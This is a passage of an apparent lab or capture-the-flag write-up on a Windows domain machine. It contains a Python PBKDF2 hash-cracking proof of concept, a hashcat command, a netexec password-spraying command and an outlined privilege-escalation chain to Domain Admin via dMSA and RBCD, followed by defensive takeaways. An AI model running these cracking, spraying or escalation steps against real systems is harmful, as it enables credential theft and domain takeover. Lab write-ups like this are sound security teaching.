🔨 3. Offline Hash Cracking
Format Analysis:

Algorithm: PBKDF2-HMAC-SHA256

Iterations: 600,000

Salt: AMtzteQIG7yAbZIa (UTF-8 / base64)

Digest: hex → must be converted to base64 for Hashcat

Python Cracker (Proof-of-Concept)

import hashlib, binascii


salt = b'AMtzteQIG7yAbZIa'

iterations = 600000

expected = '0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133'

  

for pwd in ["iloveyou", "iloveyou1", "admin123"]:

    dk = hashlib.pbkdf2_hmac('sha256', pwd.encode(), salt, iterations)

    if binascii.hexlify(dk).decode() == expected:

        print(f"[+] Password: {pwd}")

Hashcat-Ready Format
Corrected hash line (saved as hash.txt):


sha256:600000:AMtzteQIG7yAbZIa:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=

Command:


hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt -O

Result: iloveyou1

📈 4. Full Attack Chain Summary (Post-Foothold)
Password Spraying: netexec smb 10.10.11.252 -u users.txt -p iloveyou1 --local-auth

Foothold: WinRM as adam.scott

Privilege Escalation: PowerView → Find-InterestingDomainAcl → CreateChild on Staff OU → dMSA object creation → Resource-Based Constrained Delegation (RBCD) → Domain Admin shell

Flags Obtained:

  - User flag: C:\Users\adam.scott\Desktop\user.txt

  - Root flag: C:\Users\Administrator\Desktop\root.txt

🛡️ Defensive Takeaways
Restrict IMPERSONATE grants in MSSQL

Never store credential hashes in application databases

Audit OU permissions (CreateChild) in Active Directory

Monitor for anomalous SQL context switches and dMSA object creation

